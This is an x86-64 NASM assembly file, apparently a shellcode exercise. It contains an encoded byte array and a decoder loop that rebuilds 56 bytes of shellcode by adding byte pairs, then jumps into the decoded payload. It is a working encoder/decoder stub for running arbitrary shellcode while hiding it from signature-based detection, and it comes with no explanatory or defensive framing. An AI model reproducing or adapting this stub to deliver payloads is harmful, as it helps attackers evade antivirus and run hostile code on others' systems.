BITS 64

global _start 

section .text

_start:
	jmp real_start

	encoded_shellcode: db 0x8e,0x5d,0x05,0x1b,0xab,0x0c,0x96,0x38,0x1c,0x23,0x1c,0x93,0x72,0x45,0x3e,0x06,0xc4,0x0c,0x2e,0x6f,0x51,0x45,0x66,0x2b,0x40,0x90,0x91,0x3f,0x59,0x33,0x0e,0x89,0x77,0x35,0x62,0x55,0x1e,0x58,0x07,0x11,0x7d,0x32,0x3a,0x7d,0x03,0x73,0x08,0x15,0x04,0xa4,0x24,0x93,0x39,0x3d,0x09,0x10,0x8b,0x2c,0x11,0x6b,0x0c,0x33,0x62,0x62,0x0a,0xe6,0x92,0x68,0x1d,0x2b,0x32,0x5b,0x19,0x1c,0xbc,0x1d,0x6e,0x91,0x44,0xbb,0x7a,0x85,0x2f,0x19,0x1f,0x12,0x4d,0x7c,0x55,0x2b,0x3e,0x83,0x05,0x1b,0xac,0x4a,0x0f,0x07,0x13,0x35,0x6c,0x93,0xaa,0x1c,0x97,0x4b,0x8c,0x6d,0x28,0xc3,0x04,0xc6

real_start:
	xor rax, rax
	xor rbx, rbx
	mov rcx, 56 ; TODO shellcode original lenth
	lea r10, [rel encoded_shellcode] ; points to plain shellcode
	lea r11, [rel encoded_shellcode] ; points to encoded shellcode (byte 1)
	mov r12, r11		; byte 2
	inc r12

decode:
	mov byte al, [r11]
	mov byte bl, [r12]
	add al, bl
	mov byte [r10], al

	inc r10 ; plain shellcode
	add r11, 2
	mov r12, r11
	inc r12

	loop decode

	jmp encoded_shellcode
